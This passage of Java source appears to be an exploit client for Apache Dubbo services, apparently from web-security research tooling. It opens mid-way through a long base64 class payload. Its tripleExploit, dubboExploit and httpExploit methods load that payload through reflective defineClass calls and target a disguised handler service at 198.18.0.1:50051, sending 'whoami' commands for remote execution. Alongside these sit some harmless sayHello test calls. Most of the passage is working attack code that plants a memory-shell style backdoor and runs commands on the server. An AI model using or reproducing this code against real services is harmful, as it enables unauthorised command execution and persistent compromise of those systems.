Oe/Kyy2AV+aACm7AONZuwAqWbcAKyy2AJi2ADETAWG2ADErtgCYtgAxtgA3twDnv7EAAAABAf8AAAAGAAQmEB4tAf0AAAACAUoAAgD/AQAAAgH+AAAAWAAEAAMAAAA4KwO9AGG2AWhNLAS2AWssA70ABLYBbrBNuwDjWbsAKlm3ACsTAXC2ADErtgCYtgAxtgA3LLcBc78AAQAAABYAFwFkAAEB/wAAAAYAAVcHAWQB/QAAAAIBYgACAQMBBAACAf4AAADEAAMACAAAAJ64ATE6BLsBDFm3AXU6BRkFLLYBeRkFLbYBfRkFK7YBgBkFEwGCtgGFGQUTAYe2AYoZBRkEtgGQAbYBlsABmLYBnLsBOlkZBLYBoLcBozoGGQa5AaYBAJkAEbsBOlkZBLYBqbcBozoGGQUZBrYBrbsBOlkZBLYBsLcBozoHGQe5AaYBAJkAEbsBOlkZBLYBs7cBozoHGQUZB7YBthkFsAAAAAEB/wAAABQAAv4AZwcBjAcBDAcBpfwALAcBpQH9AAAAAgF0AAIA7gDbAAEB/gAAAG4AAwAFAAAAULgBMU0stgGgTi25AaYBAJkAD7sBOlkstgGptwGjTi25AaYBAJkABSuwuAG7OgQtuQG/AQAZBCu6AdIAALkB2AIAEwHauAHguQHkAgDAAF+wAAAAAQH/AAAADAAC/QAeBwGMBwGlCgACADoAOwABAf4AAACBAAMABgAAADYBTbsAv1m3AMBOuwBFWS23AedNKyy2AesttgHsOgQsxgAHLLYB7RkEsDoFLMYAByy2Ae0ZBb8AAgACAB4AKQAAACkAKwApAAAAAQH/AAAAKQAD/gAmBwBFBwC/BwBf/wACAAMHAAIHAB8HAEUAAQcAH/4ACQAABwAfEAoBwQHCAAEB/gAAAC0ABQADAAAAIRMB7we9AARZAyy2AfJTWQQqU1kFLLYB9lNZBitTuAH6sAAAAAAACAH7AB0AAQH+AAAANgACAAAAAAAfpwARABMBPbMALQOzACinAAcAp//xALsAAlm3AfxXsQAAAAEB/wAAAAUAAwMNAwACAgEAAAAKAAEABgAIAAkAGQICAAAADAABAc4AAwHAAcUBxw==");
            String s = service.loadBytes(bytes);
            System.out.println(s);
        } finally {
            reference.destroy();
        }
    }

    public static void tripleExploit() throws Exception {
        String url = "tri://198.18.0.1:50051/org.apache.http.web.handlers.UiHMC.ErrorDubboService$1";
        String b = "yv66vgAAADQABwEANm9yZy9hcGFjaGUvaHR0cC93ZWIvaGFuZGxlcnMvVWlITUMvRXJyb3JEdWJib1NlcnZpY2UkMQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAZoYW5kbGUBAAYoW0IpW0IGAQACAAQAAAAAAAEEAQAFAAYAAAAA";
        byte[] bytes = Base64.getDecoder().decode(b);
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        ClassLoader classLoader = ClassGenerator.class.getClassLoader();
        Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        ReferenceConfig<Object> reference = new ReferenceConfig<>();
        reference.setApplication(new ApplicationConfig("dubbo-consumer"));
        reference.setInterface(clazz);
        reference.setVersion("1.0.0");
        reference.setProxy("jdk");
        reference.setUrl(url);

        try {
            Object svc = reference.get();
            byte[] result = (byte[]) svc.getClass().getMethod("handle", byte[].class).invoke(svc, "whoami".getBytes());
            System.out.println(new String(result));
        } finally {
            reference.destroy();
        }
    }

    public static void httpSayHello(String baseUrl) throws Exception {
        URL url = new URL(baseUrl + "/com.reajason.javaweb.dubbo.DemoService/sayHello");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("tri-service-version", "1.0.0");
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            os.write("\"world\"".getBytes());
            os.flush();
        }

        int code = conn.getResponseCode();
        String body = readResponse(conn);
        System.out.println("HTTP " + code + ": " + body);
    }

    public static void httpExploit(String baseUrl) throws Exception {
        String servicePath = "/org.apache.http.web.handlers.UiHMC.ErrorDubboService$1/handle";
        URL url = new URL(baseUrl + servicePath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("tri-service-version", "1.0.0");
        conn.setDoOutput(true);

        String base64Cmd = Base64.getEncoder().encodeToString("whoami".getBytes());
        try (OutputStream os = conn.getOutputStream()) {
            os.write(("\"" + base64Cmd + "\"").getBytes());
            os.flush();
        }

        int code = conn.getResponseCode();
        String body = readResponse(conn);
        System.out.println("HTTP " + code + ": " + body);
    }

    private static String readResponse(HttpURLConnection conn) throws IOException {
        InputStream is = conn.getResponseCode() >= 400 ? conn.getErrorStream() : conn.getInputStream();
        if (is == null) {
            return "";
        }
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int n;
            while ((n = is.read(buffer)) > 0) {
                baos.write(buffer, 0, n);
            }
            return baos.toString();
        } finally {
            is.close();
        }
    }

    public static void dubboSayHello(String url) {
        ReferenceConfig<DemoService> reference = new ReferenceConfig<>();
        reference.setApplication(new ApplicationConfig("dubbo-consumer"));
        reference.setInterface(DemoService.class);
        reference.setVersion("1.0.0");
        reference.setUrl(url);

        try {
            DemoService service = reference.get();
            String result = service.sayHello("world");
            System.out.println(result);
        } finally {
            reference.destroy();
        }
    }

    public static void dubboExploit() throws Exception {
        String url = "dubbo://198.18.0.1:50051/org.apache.http.web.handlers.VTcIU.AuthDubboService";
        String b = "yv66vgAAADQABwEANW9yZy9hcGFjaGUvaHR0cC93ZWIvaGFuZGxlcnMvVlRjSVUvQXV0aER1YmJvU2VydmljZSQxBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABmhhbmRsZQEABihbQilbQgYBAAIABAAAAAAAAQQBAAUABgAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(b);
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        ClassLoader classLoader = ClassGenerator.class.getClassLoader();
        Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        ReferenceConfig<Object> reference = new ReferenceConfig<>();
        reference.setApplication(new ApplicationConfig("dubbo-consumer"));
        reference.setInterface(clazz);
        reference.setVersion("1.0.0");
        reference.setProxy("jdk");
        reference.setUrl(url);

        try {
            Object svc = reference.get();
            byte[] result = (byte[]) svc.getClass().getMethod("handle", byte[].class).invoke(svc, "whoami".getBytes());
            System.out.println(new String(result));
        } finally {
            reference.destroy();
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private static void registerInJavassistClassPool(ClassLoader classLoader, byte[] classBytes) {
        try {
            Object pool = ClassGenerator.getClassPool(classLoader);
            pool.getClass().getMethod("makeClass", java.io.InputStream.class)
                    .invoke(pool, new ByteArrayInputStream(classBytes));
        } catch (Throwable ignored) {
        }
    }
}
